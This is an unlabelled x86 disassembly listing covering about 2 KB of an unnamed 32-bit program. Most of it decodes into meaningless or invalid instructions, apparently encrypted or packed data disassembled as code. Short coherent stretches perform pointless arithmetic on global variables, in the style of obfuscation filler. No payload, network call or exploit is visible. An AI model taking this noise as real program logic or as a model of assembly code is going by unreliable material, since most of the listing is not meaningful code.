  406125:	lock rcl DWORD PTR [edi-0x174ab5a],0xb5
  40612d:	and    edi,esi
  40612f:	xchg   ebx,eax
  406130:	sub    eax,0xc1792c16
  406135:	lds    esp,FWORD PTR [esi-0x182c9dd3]
  40613b:	jno    0x406175
  40613d:	ficom  WORD PTR [ecx+0x12917c9c]
  406143:	icebp  
  406144:	jmp    FWORD PTR [esi]
  406146:	mov    bl,0xfe
  406148:	fwait
  406149:	lea    ecx,[eax-0x35]
  40614c:	or     al,0x30
  40614e:	ret    
  40614f:	fisttp QWORD PTR [esi-0x37b8da89]
  406155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406156:	jg     0x406169
  406158:	fcomi  st,st(1)
  40615a:	add    BYTE PTR [eax-0x7f],ch
  40615d:	test   BYTE PTR [ebp-0x18],bl
  406160:	scas   al,BYTE PTR es:[edi]
  406161:	push   ecx
  406162:	mov    ds:0x686f378c,al
  406167:	pop    eax
  406168:	cmp    ah,bh
  40616a:	das    
  40616b:	aad    0x7b
  40616d:	jmp    0xe99e0f5f
  406172:	sbb    ah,0x4f
  406175:	es jle 0x40613f
  406178:	xor    esp,DWORD PTR [ecx]
  40617a:	ja     0x4061ef
  40617c:	psraw  mm7,mm1
  40617f:	push   edx
  406180:	mov    dh,0x52
  406183:	pop    esp
  406184:	and    DWORD PTR [eax+0x29],esi
  406187:	inc    esp
  406188:	xor    bl,dl
  40618a:	inc    esp
  40618b:	stc    
  40618c:	push   es
  40618d:	xlat   BYTE PTR ds:[ebx]
  40618e:	dec    esp
  40618f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406191:	jnp    0x40612d
  406193:	adc    al,0x4e
  406195:	sub    DWORD PTR [ecx+0x755c0a0],esp
  40619b:	and    DWORD PTR ds:0x27545600,esi
  4061a1:	retf   
  4061a2:	into   
  4061a3:	jle    0x4061d4
  4061a5:	and    eax,0x9642ce19
  4061aa:	arpl   WORD PTR [esi],bx
  4061ac:	scas   eax,DWORD PTR es:[edi]
  4061ad:	mov    esp,0x91da3d7f
  4061b2:	inc    eax
  4061b3:	lgs    edi,FWORD PTR [edx+0x174141a3]
  4061ba:	jle    0x406162
  4061bc:	pop    esp
  4061bd:	pop    es
  4061be:	(bad)  
  4061bf:	les    ebx,FWORD PTR [esp+eax*1]
  4061c2:	into   
  4061c3:	or     DWORD PTR [edx-0x26],edi
  4061c6:	cmp    ch,BYTE PTR [ebp+ebx*1-0x5]
  4061ca:	call   0xfc082f0b
  4061cf:	clc    
  4061d0:	pop    ss
  4061d1:	dec    edx
  4061d2:	jns    0x40615c
  4061d4:	add    eax,0xda52139f
  4061d9:	lock mov cs,WORD PTR [ebp-0x20]
  4061dd:	adc    ebx,DWORD PTR [esi]
  4061df:	and    al,BYTE PTR [ebp+0x1a78b42a]
  4061e5:	cdq    
  4061e6:	clc    
  4061e7:	cdq    
  4061e8:	nop
  4061e9:	loope  0x40616e
  4061eb:	sub    esp,edx
  4061ed:	inc    ebx
  4061ee:	push   0xeb81d12
  4061f3:	pop    edx
  4061f4:	dec    ebx
  4061f5:	mov    eax,ds:0x824b1a2d
  4061fa:	adc    ebp,edi
  4061fc:	ret    0x7aba
  4061ff:	bound  eax,QWORD PTR [eax+eiz*8-0x6]
  406203:	jg     0x406210
  406205:	adc    BYTE PTR [ebx],0xd2
  406208:	xchg   ebp,eax
  406209:	out    0x9,al
  40620b:	or     DWORD PTR [eax+0x74],ecx
  40620e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40620f:	sub    al,0x1c
  406211:	popa   
  406212:	jno    0x40620b
  406214:	jns    0x40626b
  406216:	push   es
  406217:	push   eax
  406218:	push   cs
  406219:	cs in  eax,dx
  40621b:	sbb    al,0x5a
  40621d:	pop    ecx
  40621e:	bnd jl 0x406265
  406221:	add    BYTE PTR [esi],0xf7
  406224:	call   0x1948:0xeb7dd593
  40622b:	cwde   
  40622c:	push   0xffffff94
  40622e:	popa   
  40622f:	dec    esi
  406230:	or     dl,BYTE PTR [eax+0x49]
  406233:	outs   dx,BYTE PTR ds:[esi]
  406234:	push   ss
  406235:	mov    ch,al
  406237:	scas   al,BYTE PTR es:[edi]
  406238:	cmp    edx,DWORD PTR [ebp+0x4efdb4dd]
  40623e:	mov    ds:0xcbc1d35f,al
  406243:	test   al,0x1f
  406245:	scas   eax,DWORD PTR es:[edi]
  406246:	sbb    BYTE PTR [eax],dh
  406248:	push   ecx
  406249:	xchg   ebx,eax
  40624a:	(bad)  [ecx]
  40624c:	test   al,0x13
  40624e:	cmp    BYTE PTR [edi+0x73],0xe0
  406252:	push   ebx
  406253:	fisttp DWORD PTR [ecx+esi*2+0x38]
  406257:	jbe    0x40623c
  406259:	xor    eax,0x8e8c56d8
  40625e:	jg     0x40623e
  406260:	xlat   BYTE PTR ds:[ebx]
  406261:	dec    esp
  406262:	xchg   edx,eax
  406263:	mov    esi,0x301e40f6
  406268:	cmp    eax,0x5e1a9830
  40626d:	dec    edx
  40626e:	inc    esi
  40626f:	repnz pop eax
  406271:	dec    esp
  406272:	pop    ss
  406273:	jae    0x406247
  406275:	or     bh,0x3a
  406278:	inc    esi
  406279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40627a:	add    eax,0xb317fc8c
  40627f:	add    ch,al
  406281:	jno    0x40621a
  406283:	pop    ebx
  406284:	xor    al,BYTE PTR [ecx+0x25ea7208]
  40628a:	ins    BYTE PTR es:[edi],dx
  40628b:	jmp    0x8b18:0x458bbdf9
  406292:	jne    0x4062a4
  406294:	sub    DWORD PTR ds:0x42fd09,0x42fd86
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e6f3,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fd72,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fd72,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fd72,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e53b
  4062e2:	cmp    DWORD PTR ds:0x42fd72,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fd72
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fd72,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fd72
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fd72,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	mov    bl,0xcf
  406330:	mov    dl,0xe5
  406332:	mov    WORD PTR [eax+esi*2],?
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x4062e2
  40633b:	test   eax,0xc3c0d9f
  406340:	out    dx,eax
  406341:	test   dl,al
  406343:	mov    ds:0x43764c1e,al
  406348:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40634a:	add    eax,0xa8dcf4c
  40634f:	mov    cl,0xa5
  406351:	xchg   ebx,eax
  406352:	lock aas 
  406354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406355:	jno    0x4063cc
  406357:	push   0x43
  406359:	lods   eax,DWORD PTR ds:[esi]
  40635a:	jo     0x40638c
  40635c:	data16 and BYTE PTR [eax+edx*1+0x137568b7],al
  406364:	retf   
  406365:	mov    ds:0x290ffb31,al
  40636a:	and    ecx,DWORD PTR [esi]
  40636c:	pop    ebp
  40636d:	je     0x406399
  40636f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406370:	out    dx,al
  406371:	call   0xffc3b2ef
  406376:	fsub   DWORD PTR [ebp+ecx*2-0x2f5700e1]
  40637d:	in     al,dx
  40637e:	mov    al,ds:0x89473b88
  406383:	pop    DWORD PTR [edx-0x18]
  406386:	retf   
  406387:	adc    bl,BYTE PTR [eax]
  406389:	neg    dh
  40638b:	rol    BYTE PTR [eax+0x17ab804f],cl
  406391:	cmc    
  406392:	leave  
  406393:	lds    eax,FWORD PTR [esi+edi*2+0x35]
  406397:	push   esi
  406398:	(bad)  
  406399:	hlt    
  40639a:	data16 (bad) 
  40639c:	loop   0x40639b
  40639e:	(bad)  
  4063a0:	retf   
  4063a1:	fstp   TBYTE PTR [eax]
  4063a3:	mov    BYTE PTR [eax],cl
  4063a5:	jl     0x406356
  4063a7:	sar    DWORD PTR [edx],1
  4063a9:	sub    esi,eax
  4063ab:	or     DWORD PTR [edi+edi*8],ecx
  4063ae:	mov    edx,0x9fd62667
  4063b3:	push   ebx
  4063b4:	out    dx,eax
  4063b5:	sub    al,0x26
  4063b7:	mov    esi,0xf6cdb773
  4063bc:	gs std 
  4063be:	popa   
  4063bf:	dec    eax
  4063c0:	dec    ebp
  4063c1:	or     ch,bl
  4063c3:	xor    BYTE PTR [edx+0x7e583249],ah
  4063c9:	cmp    ch,BYTE PTR [eax-0x7d]
  4063cc:	push   ecx
  4063cd:	sbb    DWORD PTR [eax-0x31],ecx
  4063d0:	or     BYTE PTR [edi-0x42],0xc4
  4063d4:	mov    eax,0xe56539d4
  4063d9:	add    BYTE PTR [edi+ebx*8-0x2],0xbe
  4063de:	pop    ss
  4063df:	pop    es
  4063e0:	ror    BYTE PTR [eax-0x2a],0xd3
  4063e4:	stos   BYTE PTR es:[edi],al
  4063e5:	mov    BYTE PTR [eax+edi*4-0x21f4a43d],ch
  4063ec:	ror    DWORD PTR [edx+0x19],1
  4063ef:	leave  
  4063f0:	jmp    0x3b30e840
  4063f5:	scas   eax,DWORD PTR es:[edi]
  4063f6:	int    0xb5
  4063f8:	(bad)  
  4063f9:	fs push ebp
  4063fb:	mov    DWORD PTR [eax],ecx
  4063fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063fe:	mov    ah,0x5b
  406400:	daa    
  406401:	ins    BYTE PTR es:[edi],dx
  406402:	mov    ds:0x4d39defb,al
  406407:	shl    edi,cl
  406409:	sub    al,0xac
  40640b:	out    0x8e,eax
  40640d:	cli    
  40640e:	in     al,0x88
  406410:	add    al,0x65
  406412:	pop    ebp
  406413:	loope  0x4063cf
  406415:	sar    DWORD PTR [ecx],cl
  406417:	mov    bl,BYTE PTR [esi-0x6c]
  40641a:	sbb    esi,ecx
  40641c:	xchg   esi,ecx
  40641e:	jge    0x4063a3
  406420:	cs icebp 
  406422:	jecxz  0x406498
  406424:	inc    edi
  406425:	ss pop edx
  406427:	ins    DWORD PTR es:[edi],dx
  406428:	pop    ebp
  406429:	or     BYTE PTR [esi+ecx*1-0x36],dl
  40642d:	cmp    al,0x84
  40642f:	mov    ah,0x87
  406431:	adc    ch,BYTE PTR [ebx+eiz*4-0x2d4cc86f]
  406438:	dec    BYTE PTR [edx]
  40643a:	adc    eax,eax
  40643c:	inc    ecx
  40643d:	jne    0x4064ae
  40643f:	lods   eax,DWORD PTR ds:[esi]
  406440:	fcomp  DWORD PTR [ebx+0x38e43163]
  406446:	cmp    al,0x59
  406448:	and    eax,0xce505844
  40644d:	mov    ah,0x6d
  40644f:	or     BYTE PTR [edi+0x6b],0xa1
  406453:	xor    DWORD PTR [ebx-0x5f],0xffffff96
  406457:	test   DWORD PTR [ebx+0x35],edx
  40645a:	jle    0x4063e3
  40645c:	or     dh,dl
  40645e:	int3   
  40645f:	shl    DWORD PTR [edx+0xd13351b],cl
  406465:	test   DWORD PTR [eax+ecx*4+0x320c0d28],esp
  40646c:	push   cs
  40646d:	cld    
  40646e:	jno    0x406454
  406470:	(bad)  
  406471:	je     0x406408
  406473:	pop    ss
  406474:	ins    DWORD PTR es:[edi],dx
  406475:	test   BYTE PTR [eax-0x38],dl
  406478:	xchg   BYTE PTR [eax],dh
  40647a:	pop    ss
  40647b:	jne    0x40645d
  40647d:	jns    0x406439
  40647f:	outs   dx,DWORD PTR ds:[esi]
  406480:	(bad)  
  406481:	xchg   DWORD PTR [ecx-0x500a3a40],esp
  406487:	sub    eax,0x27d5156f
  40648c:	jae    0x40642c
  40648e:	jp     0x40642c
  406490:	mov    eax,0xe95a83e3
  406495:	test   ch,ah
  406497:	aam    0x73
  406499:	mov    eax,0xe4776432
  40649e:	inc    edi
  40649f:	cmp    DWORD PTR [esi+eiz*2-0x27],edi
  4064a3:	sbb    dl,BYTE PTR [ecx-0x6b]
  4064a6:	stos   DWORD PTR es:[edi],eax
  4064a7:	ja     0x406501
  4064a9:	cmp    DWORD PTR [edx],ebp
  4064ab:	jmp    0x4064c6
  4064ad:	(bad)  
  4064ae:	push   0x11
  4064b0:	sbb    al,BYTE PTR [ebp+0x55]
  4064b3:	cmp    al,BYTE PTR [esi+0x74]
  4064b6:	push   es
  4064b7:	and    eax,0xd29a1838
  4064bc:	gs push esp
  4064be:	dec    edx
  4064bf:	push   cs
  4064c0:	inc    edi
  4064c1:	and    BYTE PTR ss:[eax-0x69f134b3],al
  4064c8:	and    eax,0xca87b19e
  4064cd:	int    0xb2
  4064cf:	mov    dl,0xa6
  4064d1:	push   es
  4064d2:	push   edi
  4064d3:	push   edx
  4064d4:	leave  
  4064d5:	ret    0x4fc2
  4064d8:	iret   
  4064d9:	jg     0x406546
  4064db:	imul   edi,DWORD PTR [eax],0x2a
  4064de:	in     al,0xfa
  4064e0:	(bad)  
  4064e1:	xor    ecx,esi
  4064e3:	pop    esi
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fd76,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fcf9
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fd72,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fd72,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fcd9,0x42e6fb
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	int    0xcb
  406568:	lahf   
  406569:	push   eax
  40656a:	xor    edi,DWORD PTR [edx]
  40656c:	jo     0x4065de
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	outs   dx,BYTE PTR ds:[esi]
  406573:	pop    edx
  406574:	xor    ebp,DWORD PTR [ebx+0xb5c6903]
  40657a:	mov    ds:0x676f8cf2,al
  40657f:	mov    ds:0x8aa33c53,eax
  406584:	rcr    ebp,0x76
  406587:	inc    esp
  406588:	retf   
  406589:	push   edx
  40658a:	aaa    
  40658b:	mov    edi,0xe1d4f7df
  406590:	ror    DWORD PTR [ebx+0x9],0x28
  406594:	fxch   st(7)
  406596:	pop    edx
  406597:	xlat   BYTE PTR ds:[ebx]
  406598:	sbb    al,0xf5
  40659a:	push   esp
  40659b:	clc    
  40659c:	idiv   BYTE PTR [eax+0x3803767b]
  4065a2:	(bad)  
  4065a3:	(bad)  
  4065a4:	pop    edi
  4065a5:	enter  0x27bf,0x1d
  4065a9:	ins    DWORD PTR es:[edi],dx
  4065aa:	dec    eax
  4065ab:	sub    DWORD PTR ds:0xf8be2500,ecx
  4065b1:	and    bl,BYTE PTR [ecx+edi*8-0x181df23]
  4065b8:	mov    edi,ss
  4065ba:	or     al,0xc6
  4065bc:	popf   
  4065bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065be:	cwde   
  4065bf:	jnp    0x406574
  4065c1:	out    0xba,eax
  4065c3:	pop    es
  4065c4:	sbb    esp,DWORD PTR [ecx-0xa9957f2]
  4065ca:	or     DWORD PTR [eax-0x65bb9a54],edi
  4065d0:	jo     0x4065e6
  4065d2:	mov    ebx,0x6c6cb175
  4065d7:	aaa    
  4065d8:	les    edx,FWORD PTR [ebp+esi*2-0x6143df09]
  4065df:	inc    edi
  4065e0:	hlt    
  4065e1:	sub    eax,0x85f526ca
  4065e6:	int    0x6b
  4065e8:	pop    ecx
  4065e9:	sbb    esi,DWORD PTR [ecx]
  4065eb:	jno    0x40665d
  4065ed:	mov    eax,0xf03424cc
  4065f2:	mov    bh,0x46
  4065f4:	idiv   BYTE PTR [ebx+0x421a29d1]
  4065fa:	add    dh,BYTE PTR [ecx+0x32]
  4065fd:	shl    ah,1
  4065ff:	mov    bh,0xa3
  406601:	popa   
  406602:	adc    DWORD PTR [ebx+edx*8],ebp
  406605:	mov    ebx,0xde84e544
  40660a:	cs push eax
  40660c:	jne    0x40663c
  40660e:	cdq    
  40660f:	inc    edi
  406610:	(bad)  
  406611:	aam    0xd6
  406613:	dec    edx
  406614:	in     al,dx
  406615:	jb     0x406677
  406617:	xor    ebx,esp
  406619:	adc    eax,0xabbd3e87
  40661e:	in     al,dx
  40661f:	dec    edx
  406620:	pop    esp
  406621:	inc    edi
  406622:	loop   0x4065ba
  406624:	loope  0x40664a
  406626:	xlat   BYTE PTR ds:[ebx]
  406628:	pop    ebp
  406629:	push   eax
  40662a:	das    
  40662b:	fadd   QWORD PTR [eax+edi*8]
  40662e:	sub    ebp,ecx
  406630:	mov    DWORD PTR [ebp+0x66],edi
  406633:	pop    edx
  406634:	inc    edi
  406635:	push   eax
  406636:	jmp    0x12c8:0xa66b29a5
  40663d:	mov    ds:0xbe337445,al
  406642:	(bad)  
  406643:	loop   0x4066ab
  406645:	ins    BYTE PTR es:[edi],dx
  406646:	dec    ebx
  406647:	(bad)  
  406648:	dec    ecx
  406649:	loope  0x406600
  40664b:	je     0x4066a4
  40664d:	(bad)  
  40664e:	xchg   ebx,eax
  40664f:	(bad)  
  406650:	fisubr DWORD PTR [esp+ebx*8+0x1b0e5d1b]
  406657:	xor    cl,0x8d
  40665a:	fwait
  40665b:	pop    edi
  40665c:	xchg   ebx,eax
  40665d:	lods   al,BYTE PTR ds:[esi]
  40665e:	mov    edi,0x3045d959
  406663:	ins    BYTE PTR es:[edi],dx
  406664:	les    esp,FWORD PTR ds:0xd1e853ec
  40666a:	mov    ebx,0xffbe1cc1
  406670:	mov    esp,0xd0a8e4d
  406675:	int3   
  406676:	in     al,dx
  406677:	and    BYTE PTR [edi+0x9],dh
  40667a:	or     DWORD PTR [edi+0x2122feda],esi
  406680:	xor    eax,0xa01762ec
  406685:	dec    ebx
  406686:	sahf   
  406687:	pop    ebx
  406688:	sbb    BYTE PTR [edi+0x665aae86],ah
  40668e:	(bad)  
  40668f:	fdivr  DWORD PTR [edx-0xf]
  406692:	fidiv  DWORD PTR [ecx]
  406694:	sub    BYTE PTR [ebp+0x79],cl
  406697:	push   ecx
  406698:	jns    0x40667f
  40669a:	adc    eax,0x5cb213d9
  40669f:	mov    bh,0xfa
  4066a1:	(bad)  
  4066a2:	pop    edx
  4066a3:	adc    ah,BYTE PTR [ecx]
  4066a5:	jl     0x406645
  4066a7:	sbb    BYTE PTR [eax+0x248bdcad],dl
  4066ad:	lods   eax,DWORD PTR ds:[esi]
  4066ae:	sahf   
  4066af:	mov    eax,ds:0x55573741
  4066b4:	mov    BYTE PTR [edx],cl
  4066b6:	iret   
  4066b7:	sti    
  4066b8:	into   
  4066b9:	dec    edi
  4066ba:	xchg   ebx,eax
  4066bb:	gs dec edi
  4066bd:	cmp    cl,bh
  4066bf:	xchg   ebx,eax
  4066c0:	mov    bh,BYTE PTR [ebx-0x73]
  4066c3:	das    
  4066c4:	sub    al,0xb8
  4066c6:	out    dx,al
  4066c7:	aad    0x5f
  4066c9:	pop    edi
  4066ca:	(bad)  
  4066cb:	clc    
  4066cc:	dec    esp
  4066cd:	adc    ebx,DWORD PTR [ebx-0x4e]
  4066d0:	out    dx,eax
  4066d1:	or     esp,ebp
  4066d3:	stc    
  4066d4:	mov    bh,0x4f
  4066d6:	jne    0x4066e2
  4066d8:	fdivr  QWORD PTR [edi+0x58ebab49]
  4066de:	popa   
  4066df:	push   cs
  4066e0:	cmp    eax,0x5be3780e
  4066e5:	push   ebx
  4066e6:	xchg   esi,eax
  4066e7:	call   0x2dbd:0x6ff4d57
  4066ee:	inc    eax
  4066ef:	test   BYTE PTR gs:[eax+0x6da287a1],dl
  4066f6:	push   edi
  4066f7:	fs cli 
  4066f9:	sbb    al,BYTE PTR [ebx+0x31]
  4066fc:	xchg   ebx,eax
  4066fd:	mov    DWORD PTR [ebx],esp
  4066ff:	inc    eax
  406700:	outs   dx,BYTE PTR ds:[esi]
  406701:	daa    
  406702:	ins    BYTE PTR es:[edi],dx
  406703:	daa    
  406704:	pop    ecx
  406705:	cs or  ebp,ebp
  406708:	lods   eax,DWORD PTR ds:[esi]
  406709:	std    
  40670a:	mov    ebp,0x1a0aea90
  40670f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406710:	sti    
  406711:	nop
  406712:	out    dx,al
  406713:	in     al,0xa3
  406715:	imul   ebx,DWORD PTR [edx-0x2d],0x5e
  406719:	je     0x406773
  40671b:	add    BYTE PTR [edx],bh
  40671d:	(bad)  
  40671e:	into   
  40671f:	arpl   WORD PTR [edx*4+0x6e96d592],cx
  406726:	psraw  mm1,QWORD PTR [eax+0xaa2d354]
  40672d:	cli    
  40672e:	xchg   ebx,eax
  40672f:	stos   DWORD PTR es:[edi],eax
  406730:	mov    cl,BYTE PTR [ecx+0x5b85a5f2]
  406736:	sbb    BYTE PTR [ecx+0x1e486a7],bh
  40673c:	sbb    BYTE PTR [esi],al
  40673e:	outs   dx,DWORD PTR ds:[esi]
  40673f:	rol    BYTE PTR [esi],1
  406741:	push   cs
  406742:	jp     0x4067b3
  406744:	mov    dl,0x9e
  406746:	cmp    BYTE PTR [ecx+0x2b],bh
  406749:	or     al,0x26
  40674b:	push   ebp
  40674c:	ss sub bh,al
  40674f:	in     eax,0xee
  406751:	aam    0x5d
  406753:	pop    esp
  406754:	jnp    0x4067af
  406756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406757:	repz daa 
  406759:	jmp    0x36d5a298
  40675e:	fcom   DWORD PTR [edx+0x2b88b5]
  406764:	test   al,0x1b
  406766:	add    eax,0xe9024796
  40676b:	ret    0x3601
  40676e:	mov    dh,0xcb
  406770:	loopne 0x406746
  406772:	jb     0x4067ac
  406774:	and    dh,dh
  406776:	rol    DWORD PTR [ecx],cl
  406778:	imul   BYTE PTR [esi]
  40677a:	dec    ebx
  40677b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40677c:	mov    edi,0xbea063d3
  406781:	js     0x406798
  406783:	shl    DWORD PTR [bx+di+0x5c37],cl
  406788:	out    0x13,eax
  40678a:	sub    edx,DWORD PTR [edi-0x28]
  40678d:	sbb    eax,0x978e7d7b
  406792:	loopne 0x40679e
  406794:	inc    esi
  406795:	sar    BYTE PTR [esi],0x3d
  406798:	loope  0x4067ec
  40679a:	mov    ch,0x77
  40679c:	out    dx,eax
  40679d:	fld    DWORD PTR [edi-0x7e]
  4067a0:	shr    DWORD PTR [edi+0x6295c0aa],0xd4
  4067a7:	jmp    0x406801
  4067a9:	imul   edx,DWORD PTR [esi+0x3e],0x46
  4067ad:	and    eax,0x9ca2cc9e
  4067b2:	jecxz  0x406746
  4067b4:	or     ah,BYTE PTR [esi]
  4067b6:	xchg   esp,eax
  4067b7:	sbb    al,0x38
  4067b9:	jge    0x40674b
  4067bb:	mov    BYTE PTR [edx+esi*1-0x2fd590a5],bl
  4067c2:	cmp    bl,bl
  4067c4:	push   ebx
  4067c5:	inc    eax
  4067c6:	sar    BYTE PTR [edx+0x34],0x5a
  4067ca:	arpl   WORD PTR [eax-0x74],bx
  4067cd:	adc    DWORD PTR [esi-0x68a979cf],ebp
  4067d3:	add    BYTE PTR [ecx],cl
  4067d5:	scas   al,BYTE PTR es:[edi]
  4067d6:	sub    dl,BYTE PTR [esi+0x43d8a637]
  4067dc:	psrlq  mm3,QWORD PTR [ebx+0x14]
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fcd5,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e120,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e6fb,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fce5,0x42e713
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	hlt    
  406847:	repz rol DWORD PTR [ecx],1
  40684a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	mov    DWORD PTR [ecx+0x6c133552],edi
  406858:	or     eax,0x655041d
  40685d:	mov    al,ds:0x59e23d74
  406862:	add    eax,0xa045a0a7
  406867:	aaa    
  406868:	stc    
  406869:	xor    BYTE PTR [ebx-0xd],al
  40686c:	pop    edi
  40686d:	ss call 0xdafbdbed
  406873:	and    cl,BYTE PTR [ebx+0x7126ef8c]
  406879:	adc    eax,0xaba38806
  40687e:	inc    ebp
  40687f:	mov    ah,0x47
  406881:	fwait
  406882:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  406884:	add    edx,DWORD PTR [si+0x51]
  406888:	out    dx,al
  406889:	in     eax,dx
  40688a:	std    
  40688b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40688c:	cmp    bh,0x85
  40688f:	jmp    0x406876
  406891:	adc    ebx,ebp
  406893:	sbb    al,0x54
  406895:	fbld   TBYTE PTR [edx]
  406897:	xchg   edx,eax
  406898:	ror    DWORD PTR [eax+edx*4],cl
  40689b:	out    0x6f,al
  40689d:	fsubr  DWORD PTR [ecx-0x41]
  4068a0:	dec    edx
  4068a1:	pop    ss
  4068a2:	ficomp DWORD PTR [ecx+edx*8+0x381b80c8]
  4068a9:	or     ebx,DWORD PTR [esi-0x7fad1fcf]
  4068af:	pop    ds
  4068b0:	or     DWORD PTR [esi],edx
  4068b2:	call   0x6c850786
  4068b7:	scas   eax,DWORD PTR es:[edi]
  4068b8:	fadd   DWORD PTR [ecx+0x262e9162]
  4068be:	les    ebp,FWORD PTR [esi+0x7a]
  4068c1:	retf   0x62a5
  4068c4:	pop    esp
  4068c5:	(bad)  
  4068c6:	std    
  4068c7:	pop    es
  4068c8:	arpl   bx,sp
  4068ca:	sbb    edi,DWORD PTR [ebx+0x76ba1768]
  4068d0:	inc    eax
  4068d1:	sub    eax,0xde5aee37
  4068d6:	dec    esp
  4068d7:	neg    DWORD PTR [ebp+0x1498f5c6]
  4068dd:	add    edi,edi
  4068df:	fstp   QWORD PTR [ecx]
  4068e1:	adc    ebp,edx
  4068e3:	or     eax,0x422272fd
  4068e8:	dec    ebp
  4068e9:	sbb    ebx,edx
  4068eb:	mov    WORD PTR [eax-0x1238c99f],cs
  4068f1:	pop    edx
  4068f2:	jg     0x4068d6
  4068f4:	xlat   BYTE PTR ds:[ebx]
  4068f5:	ret    
  4068f6:	jmp    0x40696d
  4068f8:	fwait
  4068f9:	std    
  4068fa:	ja     0x406938
  4068fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068fd:	test   eax,0x5b17f190
  406902:	aas    
  406903:	fcmovu st,st(3)
  406905:	fwait
  406906:	mov    edx,0xc6c0a6da
  40690b:	pop    ss
  40690c:	pop    ebp
  40690d:	sub    esp,DWORD PTR [eax-0x30]
  406910:	add    DWORD PTR [edx+0x2fce8e2e],esi
  406916:	mov    ah,0xee
  406918:	cli    
  406919:	push   ds
  40691a:	mul    cl
  40691c:	xor    eax,0xe11b2061
